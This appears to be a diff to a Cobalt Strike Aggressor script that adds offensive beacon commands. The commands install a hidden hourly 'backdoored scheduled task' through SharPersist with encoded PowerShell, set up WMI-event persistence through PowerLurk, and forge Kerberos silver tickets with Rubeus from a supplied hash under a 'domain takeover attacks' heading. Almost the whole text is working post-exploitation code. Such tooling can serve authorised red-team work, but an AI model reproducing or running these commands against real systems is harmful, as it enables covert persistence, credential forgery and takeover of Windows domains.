@@ -316,24 +316,35 @@ beacon_command_register(
 #execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly
 alias persist_schtask {
     $rand = rand_alphanum(4);
-    
-    #not encoding properly!
-    $b64payload = base64_encode($2);
-    
-    blog($1, "Encoding " . $2);
-    blog($1, "Base64: " . $b64payload);
 
-    $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
-    $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
-    $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
-    blog($1, "Executing SharPersist " . $parameters);
+    if ( $2 ismatch 'psh') {
+        blog($1, "Executing Powershell Persistance");
+        $b64payload = $3;
+        
+        $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
+        $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
+        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
+    } else if ( $2 ismatch 'local') {
+        blog($1, "Executing Local Binary Persistance");
+        $payload = $3;
+
+        $parameters = '-t schtask -c "' . $payload . '"';
+        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
+    } else {
+        berror($1, "Invalid Parameter.");
+        return;
+    }
 
     bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
 }
 beacon_command_register(
     "persist_schtask",
-    "Install a backdoored scheduled task",
-    "Usage: persist_schtask [powershell commands]"
+    "Does persistance stuff",
+    "Install a backdoored scheduled task\n"
+    . "Takes a base64 encoded command for powershell\n"
+    . "or a path to an executable to run hourly\n\n"
+    . "Usage:\npersist_schtask psh [base64]\n"
+    . "persist_schtask local [path] "
 );
 
 ##WMI EVENTS
@@ -371,7 +382,7 @@ alias persist_wmievent{
 }
 beacon_command_register(
     "persist_wmievent",
-    "Use PowerLurk to reate triggers for wmi events",
+    "Use PowerLurk to create triggers for wmi events",
     "Usage: persist_wmievent [Name] [ProcessName] [listener]"
 )
 
@@ -1031,4 +1042,45 @@ beacon_command_register(
     "Specify command to run against all machines in a collection",
     "Specify command to run against all machines in a collection\n\n"
     ."Usages: sccm_massLateralMovement [CollectionName] [Command]"
+)
+
+#DOMAIN TAKEOVER ATTACKS
+## SILVER TICKETS
+sub kerberos_silverticket_cb {
+    local('$regex')
+    $regex = '(doIFXD.*)';
+    $ticket = matches($2, $regex)[0];
+
+    blog($1, $2);
+    blog($1, "Base64 Ticket = " . $ticket);
+}
+alias kerberos_silverticket {
+    $size = size(@_);
+    if ($size == 6) {
+        $user    = @_[1];
+        $domain  = @_[2];
+        $sid     = @_[3];
+        $hash    = @_[4];
+        $service = @_[5];
+
+        $parameters = "silver"
+        . " /user:" . $user
+        . " /domain:" . $domain
+        . " /sid:" . $sid
+        . " /" . $hash
+        . " /service:" . $service
+        . " /nowrap"
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters, $null, &kerberos_silverticket_cb);
+}
+beacon_command_register(
+    "kerberos_silverticket",
+    "Request a silver ticket",
+    "Use Rubeus to request a silver TGS\n\n"
+    . " Usage:\n"
+    . "kerberos_silverticket [user] [domain fqdn] [Domain SID] [hashType:hash] [service]\n\n"
+    . "See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
 )
